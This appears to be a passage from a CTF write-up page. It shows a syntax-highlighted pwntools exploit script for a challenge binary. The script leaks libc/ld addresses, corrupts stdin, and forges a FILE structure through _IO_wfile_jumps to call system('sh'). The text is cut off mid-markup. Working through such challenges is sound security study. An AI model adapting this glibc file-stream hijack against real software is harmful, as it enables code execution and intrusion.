class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; subprocess &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#from LibcSearcher import *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; tty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(c):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p, c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_sb&lt;/span&gt;() : &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;], libc_base + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data : p.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :p.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendlineafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;   :p.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text   :p.recvuntil(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pr = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; :&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;        :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int16   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg= &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s, num   :p.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%s -&amp;gt; 0x%x&amp;#x27;&lt;/span&gt; % (s, num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#, log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = remote(&amp;#x27;120.46.65.156&amp;#x27;, 32104)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf_patch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./chall&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;scm&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x14dd)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;dummy&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt; = 3735928559&amp;#x27;&lt;/span&gt;.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;dummy&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;=dummy&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x19a6)\nb *$rebase(0x1d96)\n&amp;#x27; + &amp;#x27;c\n&amp;#x27;*200)	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x1886)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;target&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt; = 1234&amp;#x27;&lt;/span&gt;.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scm(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ptr=dummy2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a=-&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;print(a)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ld_base = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) + &lt;span class=&#34;number&#34;&gt;0xbf70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = ld_base - &lt;span class=&#34;number&#34;&gt;0x3c5000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;_IO_2_1_stdin_&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptr = ld_base - &lt;span class=&#34;number&#34;&gt;0xdfa0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;value = ptr - (stdin + &lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(value):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ptr=ptr&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	count += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(count % &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(count), &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(value))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		p.clean()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x1c9f)\nb *$rebase(0x1fde)\n&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;stdin&amp;#x27;&lt;/span&gt;, stdin)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x7b&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;target12=target12&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system, binsh = get_sb()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_wfile_jumps = libc_base + &lt;span class=&#34;number&#34;&gt;0x202228&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base_addr = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;_IO_2_1_stdout_&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;  sh;\x00\x00\x00&amp;#x27;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(base_addr + &lt;span class=&#34;number&#34;&gt;0x5000&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# _lock&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(base_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(_IO_wfile_jumps - &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0xe0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(base_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scm(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;exit()&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = p64(stdin + &lt;span class=&#34;number&#34;&gt;0x83&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(stdin + &lt;span class=&#34;number&#34;&gt;0x83&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;) + p64(stdin + &lt;span class=&#34;number&#34;&gt;0x83&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + p64(base_addr) + p64(base_addr + &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(fake_io))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Do you want to exit? (y or n)&amp;#x27;&lt;/span&gt;, pl)&lt;/span&gt;&lt;br&gt;&lt;span 